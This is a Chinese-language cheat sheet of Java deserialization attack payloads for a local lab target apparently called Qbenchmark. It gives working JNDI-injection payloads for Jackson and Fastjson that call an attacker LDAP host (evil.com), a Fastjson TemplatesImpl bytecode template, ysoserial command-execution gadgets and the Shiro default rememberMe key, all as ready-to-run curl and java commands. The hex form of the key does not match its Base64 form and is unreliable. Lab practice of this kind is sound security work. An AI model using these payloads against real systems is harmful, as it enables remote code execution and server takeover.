# Java 反序列化漏洞测试 Payload
# 用于验证 Qbenchmark 靶场中的反序列化漏洞

## 1. Jackson 反序列化 Payload

### 端点
POST http://localhost:8080/deserialize/jackson

### Payload 示例

# JNDI 注入 (需要外部 LDAP 服务器)
["org.jsecurity.realm.jndi.JndiRealmFactory", {"jndiNames":"ldap://evil.com:1389/exp"}]

# 测试命令
curl -X POST http://localhost:8080/deserialize/jackson \
  -H "Content-Type: application/json" \
  -d '["org.jsecurity.realm.jndi.JndiRealmFactory", {"jndiNames":"ldap://evil.com:1389/exp"}]'

## 2. Fastjson 反序列化 Payload

### 端点
POST http://localhost:8080/fastjson/deserialize

### Payload 示例

# TemplatesImpl 字节码注入 (需要恶意字节码)
{
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": ["base64编码的恶意字节码"],
  "_name": "lightless",
  "_tfactory": {},
  "_outputProperties": {}
}

# JdbcRowSetImpl JNDI 注入
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://evil.com:1389/exp",
  "autoCommit": true
}

# 测试命令
curl -X POST http://localhost:8080/fastjson/deserialize \
  -H "Content-Type: application/json" \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com:1389/exp","autoCommit":true}'

## 3. Shiro rememberMe 反序列化 Payload

### 端点
GET http://localhost:8080/shiro/deserialize

### 生成 Payload

# 使用 ysoserial 生成 payload
java -jar ysoserial.jar CommonsCollections5 "calc.exe" > payload.ser

# 加密 payload (使用 Shiro 默认密钥)
# 使用工具: https://github.com/longofo/Shiro-550
# 或: https://github.com/j1anFen/shiro_tool

# 密钥 (Base64): kPH+bIxk5D2deZiIxcaaaA==
# 密钥 (Hex): 4A766F6279436F646547656E6572617465644279417061636865436F6D6D6F6E73537472696E67754275696C646572

### 测试命令
curl http://localhost:8080/shiro/deserialize \
  -H "Cookie: rememberMe=<加密后的Base64编码>"

---

## 4. Cookie 反序列化 Payload

### 端点
GET http://localhost:8080/deserialize/rememberMe/vuln

### 生成 Payload

# 使用 ysoserial 生成 payload 并 Base64 编码
java -jar ysoserial.jar CommonsCollections5 "calc.exe" | base64

### 测试命令
curl http://localhost:8080/deserialize/rememberMe/vuln \
  -H "Cookie: rememberMe=<Base64编码的payload>"
